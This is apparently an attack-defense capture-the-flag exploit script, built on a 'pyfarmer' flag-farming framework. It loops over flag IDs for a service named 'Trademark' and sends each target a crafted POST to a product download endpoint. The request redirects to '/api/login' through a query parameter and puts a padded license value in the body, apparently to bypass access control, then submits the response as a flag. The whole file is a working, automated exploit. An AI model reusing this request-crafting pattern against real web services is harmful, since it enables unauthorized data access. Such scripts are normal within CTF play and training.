from requests import post
from pyfarmer import farm, get_ids, print_exception, submit_flag


def main(ip: str) -> None:
    for flag_id in get_ids("http://10.10.0.1:8081/flagIds", "Trademark"):
        try:
            r = post(
                f"http://{ip}:5000/api/products/{flag_id}/download?b=/api/login",
                data="Type+license%28%29+to+see+the+full+license+text=license%3DAAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA",
            )
            submit_flag(r.text)
        except:
            print_exception()


if __name__ == "__main__":
    farm(main, __file__)
